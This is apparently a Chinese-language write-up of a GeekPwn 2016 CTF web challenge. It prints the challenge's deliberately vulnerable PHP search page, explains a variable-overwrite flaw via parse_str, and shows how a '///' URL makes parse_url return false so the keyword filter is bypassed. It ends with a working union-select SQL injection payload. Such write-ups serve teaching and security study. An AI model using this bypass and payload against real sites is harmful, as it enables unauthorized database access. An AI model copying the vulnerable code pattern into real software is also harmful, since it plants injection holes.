@@ -1,0 +1,197 @@
+- Title: GeekPwn 2016 跨次元 CTF Web
+- Link: http://sh3ll.me/archives/201611031132.txt
+- Published: 2016-11-03 11:32
+- Updated: 2017-01-17 02:21
+
+代码审计题目，代码如下：
+
+<?php
+error_reporting(0);
+if (isset($_GET['view-source'])) {
+        show_source(__FILE__);
+        exit();
+}
+include("./inc.php"); // Database Connected
+function nojam_firewall(){
+    $INFO = parse_url($_SERVER['REQUEST_URI']);
+    parse_str($INFO['query'], $query);
+    $filter = ["union", "select", "information_schema", "from"];
+    foreach($query as $q){
+        foreach($filter as $f){
+            if (preg_match("/".$f."/i", $q)){
+                nojam_log($INFO);
+                die("attack detected!");
+            }
+        }
+    }
+}
+nojam_firewall();
+function getOperator(&$operator) {
+    switch($operator) {
+        case 'and':
+        case '&&':
+            $operator = 'and';
+            break;
+        case 'or':
+        case '||':
+            $operator = 'or';
+            break;
+        default:
+            $operator = 'or';
+            break;
+}}
+if(preg_match('/session/isUD',$_SERVER['QUERY_STRING'])) {
+    exit('not allowed');
+}
+parse_str($_SERVER['QUERY_STRING']);
+getOperator($operator);
+$keyword = addslashes($keyword);
+$where_clause = '';
+if(!isset($search_cols)) {
+    $search_cols = 'subject|content';
+}
+$cols = explode('|',$search_cols);
+foreach($cols as $col) {
+    $col = preg_match('/^(subject|content|writer)$/isDU',$col) ? $col : '';
+    if($col) {
+        $query_parts = $col . " like '%" . $keyword . "%'";
+    }
+    if($query_parts) {
+        $where_clause .= $query_parts;
+        $where_clause .= ' ';
+        $where_clause .= $operator;
+        $where_clause .= ' ';
+        $query_parts = '';
+    }
+}
+if(!$where_clause) {
+    $where_clause = "content like '%{$keyword}%'";
+}
+if(preg_match('/\s'.$operator.'\s$/isDU',$where_clause)) {
+    $len = strlen($where_clause) - (strlen($operator) + 2);
+    $where_clause = substr($where_clause, 0, $len);
+}
+?>
+<style>
+    td:first-child, td:last-child {text-align:center;}
+    td {padding:3px; border:1px solid #ddd;}
+    thead td {font-weight:bold; text-align:center;}
+    tbody tr {cursor:pointer;}
+</style>
+<br />
+<table border=1>
+    <thead>
+        <tr><td>Num</td><td>subject</td><td>content</td><td>writer</td></tr>
+    </thead>
+    <tbody>
+        <?php
+            $result = mysql_query("select * from board where {$where_clause} order by idx desc");
+            while ($row = mysql_fetch_assoc($result)) {
+                echo "<tr>";
+                echo "<td>{$row['idx']}</td>";
+                echo "<td>{$row['subject']}</td>";
+                echo "<td>{$row['content']}</td>";
+                echo "<td>{$row['writer']}</td>";
+                echo "</tr>";
+            }
+        ?>
+    </tbody>
+    <tfoot>
+        <tr><td colspan=4>
+            <form method="">
+                <select name="search_cols">
+                    <option value="subject" selected>subject</option>
+                    <option value="content">content</option>
+                    <option value="content|content">subject, content</option>
+                    <option value="writer">writer</option>
+                </select>
+                <input type="text" name="keyword" />
+                <input type="radio" name="operator" value="or" checked /> or &nbsp;&nbsp;
+                <input type="radio" name="operator" value="and" /> and
+                <input type="submit" value="SEARCH" />
+            </form>
+        </td></tr>
+    </tfoot>
+</table>
+<br />
+<a href="./?view-source">view-source</a><br />
+
+漏洞很明显，line 47 parse_str 导致变量覆盖，line 59 若 $col 为 false 就不会进入赋值语句，也就是说 $query_parts 因变量覆盖可控，而
+在 line 56-59 可以看到 $col 是对输入做正则匹配的返回值，$col 可控，进而导致注入：
+
+/index.php?search_cols=a&keyword=xxxx&operator=and&query_parts={injection} 。
+
+但是在 line 12-24 可以看到有一防注入函数，想要更好出数据肯定要绕过防注入。函数是通过 parse_url、parse_str 解析 url 参数，然后通过正则
+限制关键字的方式做的过滤，常规的方法绕过相对困难。
+
+这里用到了 parse_url 函数在解析 url 时存在的 bug，通过：///x.php?key=value 的方式可以使其返回 False。具体可以看下 parse_url 的源码
+（https://github.com/php/php-src/blob/9df6112e01eacb6e068e8d23e78181918bdab548/ext/standard/url.c#L97），关键代码如下：
+
+PHPAPI php_url *php_url_parse_ex(char const *str, size_t length)
+{
+    char port_buf[6];
+    php_url *ret = ecalloc(1, sizeof(php_url));
+    char const *s, *e, *p, *pp, *ue;
+    ...snip...
+} else if (*s == '/' && *(s + 1) == '/') { /* relative-scheme URL */
+        s += 2;
+    } else {
+        just_path:
+        ue = s + length;
+        goto nohost;
+    }
+    e = s + strcspn(s, "/?#");
+    ...snip...
+    } else {
+        p = e;
+    }
+    /* check if we have a valid host, if we don't reject the string as url */
+    if ((p-s) < 1) {
+        if (ret->scheme) efree(ret->scheme);
+        if (ret->user) efree(ret->user);
+        if (ret->pass) efree(ret->pass);
+        efree(ret);
+        return NULL;
+
+可以看到，在函数 parse_url 内部，如果 url 是以 // 开始，就认为它是相对 url，而后认为 url 的部件从 url+2 开始。line 281，若 p-s < 1 
+也就是如果 url 为 ///x.php，则 p = e = s = s + 2，函数将返回 NULL。
+
+再看 PHP_FUNCTION，line 351：
+
+/* {{{ proto mixed parse_url(string url, [int url_component])
+   Parse a URL and return its components */
+PHP_FUNCTION(parse_url)
+{
+    char *str;
+    size_t str_len;
+    php_url *resource;
+    zend_long key = -1;
+    if (zend_parse_parameters(ZEND_NUM_ARGS(), "s|l", &str, &str_len, &key) == FAILURE) {
+        return;
+    }
+    resource = php_url_parse_ex(str, str_len);
+    if (resource == NULL) {
+        /* @todo Find a method to determine why php_url_parse_ex() failed */
+        RETURN_FALSE;
+    }
+
+若 php_url_parse_ex 结果为 NULL，函数 parse_url 将返回 false，测试如下：
+
+➜ ~ uname -a
+Linux kali 4.7.0-kali1-amd64 #1 SMP Debian 4.7.8-1kali1 (2016-10-24) x86_64 GNU/Linux
+➜ ~ php -v
+PHP 7.0.12-1 (cli) ( NTS )
+Copyright (c) 1997-2016 The PHP Group
+Zend Engine v3.0.0, Copyright (c) 1998-2016 Zend Technologies
+    with Zend OPcache v7.0.12-1, Copyright (c) 1999-2016, by Zend Technologies
+➜ ~ php -a
+Interactive mode enabled
+php > var_dump(parse_url('///x.php?key=value'));
+bool(false)
+
+函数 php_url_parse_ex 中还存在很多类似的问题，而 parse_url 中又没有对其解析失败的原因进行分析，导致 parse_url 频繁出现类似的 bug，比
+如主办方后来放出的 hint：Bug #55511（https://bugs.php.net/bug.php?id=55511）。
+
+$INFO = parse_url($_SERVER['REQUEST_URI']) = false，后续的过滤也就完全无用了，成功绕过防注入。最终 payload：
+
+///index.php?search_cols=a|b&keyword=xxxx&operator=and&query_parts=123 union select 1,2,3,flag from flag
